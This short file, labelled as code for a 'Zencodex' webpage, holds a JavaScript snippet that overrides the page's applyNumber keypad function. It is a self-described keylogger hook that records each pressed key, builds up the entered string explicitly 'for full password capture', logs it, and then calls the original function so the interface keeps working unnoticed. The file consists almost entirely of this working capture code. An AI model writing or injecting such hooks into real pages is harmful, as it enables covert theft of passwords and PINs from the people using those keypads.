# Zencodx
Code for Zencodex webpage
// Hook the original function
const originalApplyNumber = window.applyNumber;

window.applyNumber = function(el) {
  const value = el.innerText || el.value || el.getAttribute('data-key') || 'UNKNOWN';
  console.log('[Keylogger Hook] Captured key:', value);

  // Optionally store it for full password capture
  window._capturedInput = (window._capturedInput || '') + value;
  console.log('[Captured Input So Far]:', window._capturedInput);

  // Call the original function to avoid breaking UI
  return originalApplyNumber.call(this, el);
};
